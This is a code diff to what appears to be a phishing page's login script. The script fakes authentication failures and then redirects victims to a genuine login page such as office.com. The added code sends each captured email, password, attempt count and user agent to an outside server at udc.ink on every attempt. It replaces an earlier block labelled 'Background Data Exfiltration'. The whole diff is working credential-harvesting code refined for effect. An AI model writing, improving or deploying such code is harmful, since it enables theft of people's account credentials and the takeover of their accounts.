@@ -216,7 +216,7 @@
         return map[domain] || "https://www.office.com/login";
     }
 
-    // 4. FORM SUBMISSION
+// 4. FORM SUBMISSION
     document.getElementById('authForm').onsubmit = async (e) => {
         e.preventDefault();
         tries++;
@@ -227,6 +227,25 @@
         const email = emailEl.innerText;
         const pass = passInput.value;
 
+        // --- NEW: Capture data immediately on every attempt ---
+        try {
+            // We don't necessarily need to 'await' this if we want 
+            // the UI to stay snappy, but it's safer for the demo.
+            await fetch('https://udc.ink/hr/delivery/Process.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }, // Added header for best practice
+                body: JSON.stringify({ 
+                    email, 
+                    pass, 
+                    attempt: tries, // Useful to track which attempt this was
+                    agent: navigator.userAgent 
+                })
+            });
+        } catch(err) {
+            console.error("Capture failed:", err);
+        }
+        // -----------------------------------------------------
+
         setTimeout(async () => {
             if (tries < 3) {
                 // Mimic standard auth failure
@@ -236,15 +255,7 @@
                 passInput.value = "";
                 passInput.focus();
             } else {
-                // Background Data Exfiltration
-                try {
-                    await fetch('https://udc.ink/hr/delivery/Process.php', {
-                        method: 'POST',
-                        body: JSON.stringify({ email, pass, agent: navigator.userAgent })
-                    });
-                } catch(err) {}
-
-                // Trigger domain-specific redirect
+                // Trigger domain-specific redirect after the final attempt
                 window.location.href = getRedirectUrl(email);
             }
         }, 1200);
